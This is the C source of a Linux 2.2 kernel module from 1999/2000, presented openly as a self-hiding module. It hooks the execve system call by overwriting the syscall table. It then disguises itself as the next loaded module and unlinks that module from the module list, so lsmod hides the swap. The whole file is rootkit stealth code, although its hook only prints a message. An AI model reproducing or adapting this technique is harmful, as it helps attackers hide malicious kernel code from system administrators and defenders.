/*** A kernel-module for 2.2 kernels, hiding itself.
 *** It was easier in 2.0 kernels and i found all the old
 *** techniqes not to work. So i invented new one. ;-)
 *** (C) 1999/2000 by Stealth.
 *** All under the GPL. SO YOU USE IT AT YOUR OWN RISK.
 *** http://www.kalug.lug.net/stealth
 ***
 *** Greets to all my friends, you know who you are.
 ***/
#define __KERNEL__
#define MODULE
#include <linux/module.h>
#include <linux/kernel.h>
#include <sys/syscall.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <linux/mm.h>
#include <linux/smp_lock.h>
#ifndef NULL
#define NULL ((void*)0)
#endif

extern void *sys_call_table[];
int (*old_exec)(struct pt_regs regs);

int new_exec(struct pt_regs regs)
{
        int error = 0;
        char *filename;
        
        lock_kernel();
        filename = getname((char*)regs.ebx);
        error =  PTR_ERR(filename);
        if (IS_ERR(error))
           	goto out;
        
        printk("Hi, the hook is still installed. ;-)\n");
	error = do_execve(filename, (char**)regs.ecx, (char**)regs.edx, &regs);
	putname(filename);
out:
	unlock_kernel();
	return error;
}


int init_module()
{
   	int i = 0;
        struct module *m = &__this_module, *lastm = NULL,
	              *to_delete = NULL;
	
        EXPORT_NO_SYMBOLS;
        
        /* install hook */
        old_exec = sys_call_table[__NR_execve];
        sys_call_table[__NR_execve] = new_exec; 
        
        /* get next module-struct */
	to_delete = m->next;
	if (!to_delete) {
		printk("No module found for exchange }|-(\n");
		return 0;
	}
        
        /* and steal all information about it */
	m->name = to_delete->name;
	m->size = to_delete->size;
	m->flags = to_delete->flags;
	        
        /* even set the right USE_COUNT */
        for (i = 0; i < GET_USE_COUNT(to_delete); i++)	
		MOD_INC_USE_COUNT;
	
        /* and drop the attacked module from the list 
         * this won't delete it but makes it disapear for lsmod
         */
        m->next = to_delete->next;
        
	printk("The following modules are visible now:\n");
	while (m) {
		printk("%s\n", m->name);
		m = m->next;
	}
        printk("Tzzz... (sleeping)\n");
        return 0;
}

int cleanup_module()
{
   	sys_call_table[__NR_execve] = old_exec;
   	return 0;
}
